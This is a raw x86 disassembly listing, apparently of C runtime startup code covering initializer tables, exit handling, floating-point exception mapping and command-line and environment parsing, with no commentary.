  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
